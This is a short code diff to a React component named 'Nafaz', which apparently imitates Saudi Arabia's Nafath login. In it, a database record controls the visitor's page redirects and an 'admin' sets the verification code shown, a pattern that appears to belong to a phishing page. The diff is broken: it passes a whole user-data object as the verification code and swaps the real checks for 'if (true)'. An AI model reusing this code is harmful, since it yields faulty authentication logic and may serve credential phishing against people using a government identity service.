@@ -43,6 +43,8 @@ export default function Nafaz() {
           if (docSnapshot.exists()) {
             const userData = docSnapshot.data()
             // Assuming the PIN is stored in a field called 'nafaz_pin'
+          setVerificationCode(userData)
+
             if (userData.currentPage === '1') {
               window.location.href = '/'
             } else if (userData.currentPage === '9999') {
@@ -68,14 +70,13 @@ export default function Nafaz() {
 
   // Simulate admin verification with a timeout
   useEffect(() => {
-    if (isSubmitted) {
+    if (true) {
       // Simulate random verification or rejection
       const timer = setTimeout(() => {
-        const isVerified = Math.random() > 0.2 // 80% chance of verification success
 
-        if (isVerified) {
+        if (true) {
           // Simulate admin verification
-          setVerificationCode(Math.floor(100000 + Math.random() * 900000).toString())
+
           setShowModal(true)
           setIsSubmitted(false)
           setIsRejected(false)
